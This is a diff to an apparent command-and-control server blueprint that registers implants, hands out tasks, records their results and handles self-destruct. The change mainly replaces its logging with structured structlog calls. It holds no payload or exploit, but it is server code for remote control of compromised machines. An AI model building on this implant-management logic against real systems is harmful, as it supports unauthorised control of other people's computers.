@@ -15,12 +15,13 @@ from maliketh.crypto.ec import (
     load_privkey,
     decrypt_b64,
 )
-from maliketh.logging.standard_logger import StandardLogger, LogLevel
+from maliketh.listeners.utils import setup_logger
+import structlog
 from nacl.encoding import Base64Encoder
 import nacl.secret
 import base64
 
-logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
+logger = structlog.get_logger()
 c2 = Blueprint("c2", __name__, url_prefix=C2_PROFILE.routes.base_path)
 
 
@@ -68,6 +69,7 @@ def hello_c2():
 
 
 @c2.route(C2_PROFILE.routes.register.path, methods=C2_PROFILE.routes.register.methods)
+@setup_logger
 def register():
     # /register
     # Read implant public key from body
@@ -81,8 +83,6 @@ def register():
 
     if request.json is None or request.json.get("txid") is None:
         return "Unauthorized", 401
-
-    logger.error(request.json)
 
     # Get the (encrypted) implant public key
     implant_public_key_b64_encrypted = request.json["txid"]
@@ -108,8 +108,7 @@ def register():
         base64.b64decode(implant_public_key_b64)
         implant_public_key = load_pubkey(implant_public_key_b64)
     except Exception as e:
-        logger.error(f"{e}")
-        logger.error(f"Failed to load implant public key: {implant_public_key_b64}")
+        logger.error("Failed to load implant public key", implant_pub=implant_public_key_b64, exc_info=e)
         return "Unauthorized", 401
 
     # Check if the implant is already registered (via public key)
@@ -144,6 +143,8 @@ def register():
     db.session.add(implant)
     db.session.add(config)
     db.session.commit()
+
+    logger.info("New implant registered", implant_id=implant.implant_id, ip=real_ip, pubkey=implant_public_key_b64)
 
     send_message_to_all_queues(f"New implant registered: {implant.implant_id}")
 
@@ -189,6 +190,8 @@ def get_task():
     implant.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     db.session.commit()
 
+    logger.info("Implant checked in", implant_id=implant_id)
+
     # Get task from db
     task = get_oldest_task_for_implant(implant_id)
 
@@ -218,7 +221,7 @@ def get_task():
                 return encryptedResponse, 400
             db.session.delete(to_delete)
             db.session.commit()
-            logger.error(f"Implant {implant_id} self-destructed")
+            logger.warn("Implant self-destructed", implant_id=implant_id)
             send_message_to_all_queues(f"Implant {implant_id} self-destructed")
 
         return encryptedResponse
@@ -264,7 +267,7 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
     # If task is not None, return task
     if task is not None:
         if task.status != TASKED:
-            print("Task is not tasked, possible replay attack")
+            logger.warn("Task is not tasked, possible replay attack", task_id=tid)
             return "Unauthorized", 401
 
         if decrypted_body["status"]:
@@ -273,6 +276,8 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
         else:
             task.status = ERROR
             task.output = decrypted_body["output"]
+
+        logger.info("Task completed", task_id=tid, status=task.status)
 
         task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         db.session.commit()
@@ -287,6 +292,7 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
 
         return "OK"
     # If task is None, return empty task
+    logger.warn("Task not found", task_id=tid)
     return "Not Found", 404
 
 
